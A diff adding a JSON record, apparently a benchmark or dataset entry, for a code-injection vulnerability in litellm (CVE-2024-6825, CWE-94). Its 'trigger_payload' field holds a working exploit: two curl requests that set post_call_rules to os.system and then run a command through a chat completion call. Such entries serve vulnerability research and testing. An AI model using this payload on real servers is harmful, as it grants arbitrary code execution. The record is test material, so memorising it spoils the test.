@@ -1,0 +1,15 @@
+{
+  "file_id": "77_litellm_huntr_1d98bebb-6cf4-46c9-87c3-d3b1972973b5",
+  "numeric_id": "77",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "Code injection via untrusted module import in litellm.post_call_rules configuration",
+  "cve": "CVE-2024-6825",
+  "cwe": "CWE-94: Code Injection",
+  "library": "litellm",
+  "affected_version": "< 1.65.4.dev6",
+  "vulnerable_function": "get_instance_fn",
+  "triggerability": "direct",
+  "trigger_payload": "curl \"http://localhost:4000/config/update\" -X POST -H \"Authorization: Bearer sk-1234\" -d \"{\\\"post_call_rules\\\": \\\"os.system\\\"}\"\\ncurl -X 'POST' 'http://localhost:4000/engines/gpt-3.5-turbo/chat/completions' -H 'Authorization: Bearer sk-1234' -H 'Content-Type: application/json' -d '{\"prompt\": \"execute command\", \"model\": \"gpt-3.5-turbo\"}'",
+  "oracle": "arbitrary code execution on the server"
+}
